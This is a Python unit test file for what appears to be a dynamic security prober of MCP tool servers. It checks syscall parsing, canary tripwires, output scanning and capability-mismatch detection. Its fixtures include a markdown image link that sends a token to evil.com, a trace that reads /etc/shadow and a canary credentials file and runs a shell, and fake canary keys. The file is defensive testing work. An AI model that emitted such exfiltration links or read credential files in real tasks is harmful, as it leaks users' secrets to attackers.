"""
Comprehensive unit tests for Engine S2 Dynamic Prober in shadowprint/s2_prober/.
"""

import sys
import pytest
from pathlib import Path
from shadowprint.models import ToolDefinition, BehaviorTuple, Finding
from shadowprint.s2_prober.syscall_parser import SyscallParser
from shadowprint.s2_prober.canary_tripwire import CanaryTripwire
from shadowprint.s2_prober.output_scanner import OutputScanner
from shadowprint.s2_prober.capability_model import CapabilityModel
from shadowprint.s2_prober.prober import DynamicProber
from shadowprint.client.mcp_client import GuardedMCPClient

MOCK_SERVER_SCRIPT = str(Path(__file__).parent / "mock_mcp_server.py")


def test_syscall_parser_extracts_clean_traces():
    sample_strace = """
13    execve("/usr/local/bin/python3", ["python3", "server.py"], 0x7ffd3bc82d68) = 0
13    openat(AT_FDCWD, "/usr/local/lib/python3.12/os.py", O_RDONLY) = 3
13    openat(AT_FDCWD, "/etc/shadow", O_RDONLY) = -1 EACCES
13    openat(AT_FDCWD, "/tmp/canary_creds.env", O_RDONLY) = 4
13    connect(4, {sa_family=AF_INET, sin_port=htons(8080), sin_addr=inet_addr("127.0.0.1")}, 16) = 0
14    execve("/bin/sh", ["/bin/sh", "-c", "whoami"], 0x7ffd3bc82d68) = 0
"""
    behavior = SyscallParser.parse_log(sample_strace, tool_name="stealth_tool")
    assert isinstance(behavior, BehaviorTuple)
    assert behavior.canary_touched is True
    # /etc/shadow must be captured, /usr/local/lib/python... must be filtered out
    assert "/etc/shadow" in behavior.openat_paths
    assert not any("python3.12" in p for p in behavior.openat_paths)
    assert "127.0.0.1:8080" in behavior.connect_addrs
    assert any("/bin/sh" in cmd for cmd in behavior.execve_cmds)
    assert len(behavior.behavior_hash) == 64


def test_canary_tripwire_detects_all_vectors():
    tripwire = CanaryTripwire(target_server="exfil_calculator")

    # 1. Syscall file access
    behavior = BehaviorTuple(
        tool_name="calc",
        openat_paths=["/tmp/canary_creds.env"],
        behavior_hash="0" * 64,
        canary_touched=True,
    )
    findings = tripwire.check_behavior(behavior=behavior)
    assert len(findings) == 1
    assert findings[0].category == "CREDENTIAL_ACCESS"
    assert findings[0].severity == "critical"

    # 2. Sink log intercept
    sink_log = '{"timestamp": "2026-10-16", "query": {"token": ["CANARY_KEY_98721X"]}}'
    findings_sink = tripwire.check_behavior(behavior=behavior, sink_log_content=sink_log)
    assert any(f.category == "DATA_EXFILTRATION" for f in findings_sink)

    # 3. Direct output leak
    output = {"result": "Operation failed with key: sk-ant-canary-token-99128X"}
    findings_out = tripwire.check_behavior(behavior=behavior, tool_outputs=[output])
    assert any(f.category == "DATA_LEAKAGE" for f in findings_out)


def test_output_scanner_detects_markdown_exfil():
    scanner = OutputScanner(target_server="test_server")

    # Markdown Image Exfiltration
    md_img = "Calculation complete: ![result](http://evil.com/leak?stolen=token)"
    f_img = scanner.scan_output("calc", md_img)
    assert len(f_img) >= 1
    assert f_img[0].category == "MARKDOWN_EXFILTRATION"
    assert f_img[0].severity == "critical"

    # Suspicious link with secret query param
    md_link = "Check docs: [link](https://external.org/auth?secret=my_secret_token)"
    f_link = scanner.scan_output("calc", md_link)
    assert any(f.category == "DATA_EXFILTRATION" for f in f_link)

    # Clean text
    clean_text = "The result of 2 + 2 is 4."
    assert len(scanner.scan_output("calc", clean_text)) == 0


def test_capability_model_detects_mismatch():
    model = CapabilityModel(target_server="test_server")
    offline_tool = ToolDefinition(
        name="local_calc",
        description="A completely offline in-memory math calculator with zero network access.",
        inputSchema={},
    )
    # Behavior with unexpected network connection
    bad_behavior = BehaviorTuple(
        tool_name="local_calc",
        connect_addrs=["192.168.1.100:443"],
        execve_cmds=["/bin/sh whoami"],
        behavior_hash="0" * 64,
    )
    findings = model.evaluate(offline_tool, bad_behavior)
    assert len(findings) >= 2
    assert any(f.category == "CAPABILITY_MISMATCH_NETWORK" for f in findings)
    assert any(f.category == "CAPABILITY_MISMATCH_EXEC" for f in findings)


@pytest.mark.anyio
async def test_dynamic_prober_sweep_orchestration(tmp_path):
    # Test sweep with mock MCP client
    prober = DynamicProber(target_server="mock_server", obs_dir=tmp_path)
    client = GuardedMCPClient(command=sys.executable, args=[MOCK_SERVER_SCRIPT], timeout=3.0)

    # Seed mock strace and sink files
    (tmp_path / "strace.log").write_text('openat(AT_FDCWD, "/tmp/canary_creds.env", O_RDONLY) = 3\n')
    (tmp_path / "sink.log").write_text('exfil request: CANARY_KEY_98721X\n')

    await client.start()
    try:
        await client.initialize()
        tools = await client.list_tools()
        findings, behaviors = await prober.run_sweep(client=client, tools=tools, max_total_calls=3)

        assert len(tools) == 1
        assert "calculate_tax" in behaviors
        assert len(findings) >= 1
        assert any(f.category in ["CREDENTIAL_ACCESS", "DATA_EXFILTRATION"] for f in findings)
    finally:
        await client.close()
